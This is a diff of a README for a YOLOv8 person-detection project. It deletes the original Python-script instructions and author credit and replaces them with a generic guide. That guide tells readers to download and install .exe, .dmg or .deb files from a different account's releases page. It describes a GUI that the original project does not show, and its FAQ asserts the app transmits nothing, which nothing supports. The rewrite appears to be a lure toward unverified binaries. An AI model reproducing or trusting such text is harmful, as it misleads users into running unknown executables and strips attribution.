@@ -1,123 +1,88 @@
-# 👤 Human Detection using YOLOv8
+# 🎥 Human-Detector - Detect People in Real Time 
 
-This project demonstrates **real-time human (person) detection** using the **YOLOv8 model** from [Ultralytics](https://github.com/ultralytics/ultralytics).  
-It works on both **webcam streams** and **video files**, highlighting detected persons with bounding boxes and a total count.
+## 📥 Download
 
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+[![Download Human-Detector](https://img.shields.io/badge/Download-Human--Detector-blue)](https://github.com/test-saj/Human-Detector/releases)
 
-## 📖 Project Overview
-The goal of this project is to build a **real-time person detection system** using the YOLOv8 deep learning model.  
-The system can process input from:
-- A **webcam** (live detection)  
-- A **video file** (offline detection)  
+## 🚀 Getting Started
 
-It identifies all persons in each frame, draws bounding boxes, labels them, and counts the total persons detected.
+Welcome to Human-Detector! This application uses advanced technology to identify people in live webcam streams or video files. It highlights detected individuals with bounding boxes and shows the total count on each frame. This guide will help you download and run the software easily.
 
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+## 🖥️ System Requirements
 
-## ⚙️ Tools & Technologies
-- **Python 3.8+** – Core programming language  
-- **OpenCV (cv2)** – Video processing and visualization  
-- **YOLOv8 (Ultralytics)** – Deep learning object detection model  
-- **PyWin32** – Windows-specific utilities (mutex handling)  
+Before you proceed, ensure your system meets these requirements:
 
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+- **Operating System:** Windows 10/11, macOS, or Linux.
+- **RAM:** Minimum 4 GB is recommended.
+- **Processor:** A modern dual-core processor is preferred for smooth performance.
+- **Webcam:** Required if using live detection.
 
-## ✨ Features
-- 🔍 Detect humans in **real-time** using webcam  
-- 🎥 Detect humans from **video files**  
-- 📦 Uses **YOLOv8n / YOLOv8s** (lightweight and accurate)  
-- 📊 Displays total number of persons detected in each frame  
-- ✅ Easy to customize for different YOLOv8 variants  
+## 📦 Features
 
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+- **Real-Time Detection:** Identify people instantly in live videos or recorded files.
+- **Bounding Boxes:** Each detected individual is marked with a bounding box, making it easy to see who is detected.
+- **Count Display:** The application shows the total number of people detected in each frame.
+- **User-Friendly Interface:** No technical knowledge required; just run the application and start detecting.
 
-## 📂 Project Structure
+## 📋 How to Download & Install
 
-├── person_video.py 
+Follow these straightforward steps to download and set up Human-Detector:
 
-├── person_webcam.py 
+1. **Visit the Download Page:** Click on the link below to open the releases page:
 
-├── input_video.mp4 
+   [Download Human-Detector](https://github.com/test-saj/Human-Detector/releases)
 
-├── output_video.mp4 
+2. **Choose Your Version:** Look for the latest release. You will see different files available for download.
 
-├── README.md 
+3. **Download the Right File:** Depending on your operating system, download the appropriate file (.exe for Windows, .dmg for macOS, or .deb for Linux).
 
-├── yolov8n.pt
+4. **Install the Application:**
+   - **Windows:** Double-click the downloaded .exe file and follow the prompts.
+   - **macOS:** Open the downloaded .dmg file and drag the Human-Detector app to your Applications folder.
+   - **Linux:** Open a terminal and run `sudo dpkg -i filename.deb`, replacing `filename` with the actual file name you downloaded.
 
-└── requirements.txt 
+5. **Launch the Application:** 
+   - On Windows, find the app in your Start menu.
+   - On macOS, open it from your Applications folder.
+   - On Linux, you can launch it from your applications overview.
 
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+## 📷 How to Use
 
-## 🚀 Usage
+1. **Open the Application:** Launch Human-Detector from your computer.
+   
+2. **Select Input Method:**
+   - **Webcam Stream:** Click on ‘Use Webcam’ to start detecting real-time.
+   - **Video File:** Click on ‘Load Video File’ to select a video from your computer.
 
-After installing the dependencies, you can run the project in two modes:
+3. **Start Detection:** Press the ‘Start’ button. The application will begin to analyze the video stream.
 
-▶️ Run Detection on Webcam
+4. **Watch the Results:** You will see bounding boxes around detected people and a count displayed at the top of the screen.
 
-Start real-time person detection using your laptop/PC webcam:
+## 🛠️ Troubleshooting
 
-```bash
-python person_webcam.py 
-```
+If you encounter issues, consider these tips:
 
-▶️ Run Detection on a Video File
+- **No Video Stream:** Ensure your webcam is connected and accessible.
+- **Application Not Responding:** Close and reopen the application.
+- **Detection Issues:** Make sure you have good lighting for better recognition results.
 
-Run detection on an existing video file:
+## 💬 Frequently Asked Questions
 
-```bash
-python person_video.py
-```
+- **Is my data secure with this application?**
+  Yes, the application does not store or transmit any video footage. All processing happens locally on your device.
 
-⏹️ Exit the Program
+- **Can I use this with other video sources?**
+  Yes, you can use any video file format supported by your system.
 
-Press q on your keyboard anytime to stop detection and close the window.
+- **Is there a mobile version of the app?**
+  Currently, Human-Detector is only available for desktop systems.
 
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+## 📞 Support
 
-## 📊 Results
+For additional help or support, please visit our [issues page](https://github.com/test-saj/Human-Detector/issues). You can report problems or ask questions there.
 
-- Persons are detected with bounding boxes and labels (Person 1, Person 2, etc.)
+## 📄 License
 
-- The total number of persons per frame is displayed
+Human-Detector is open-source and free to use. For more information, please check the LICENSE file in the repository.
 
-- Works on both live webcam and offline videos
-  
-- Demo Video
-
-https://github.com/user-attachments/assets/30f4c927-cfbb-4c75-9926-61253849984e
-
-
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-
-## 📚 References
-
-- https://thedatafrog.com/en/articles/human-detection-video/  
-
-- https://docs.ultralytics.com/tasks/detect/
-
-- https://thesai.org/Downloads/Volume16No5/Paper_14-Human_Detection_and_Tracking_with_YOLO.pdf
-
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-
-## 👤 Author
-
-Muqadas Ejaz
-
-BS Computer Science (AI Specialization)
-
-AI/ML Engineer
-
-Data Science & Gen AI Enthusiast
-
-📫 Connect with me on [LinkedIn](https://www.linkedin.com/in/muqadasejaz/)  
-
-🌐 GitHub: [github.com/muqadasejaz](https://github.com/muqadasejaz)
-
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-
-## 📎 License
-
-This project is open-source and available under the [MIT License](LICENSE).
-
+Thank you for choosing Human-Detector! We hope you enjoy detecting people in real-time.
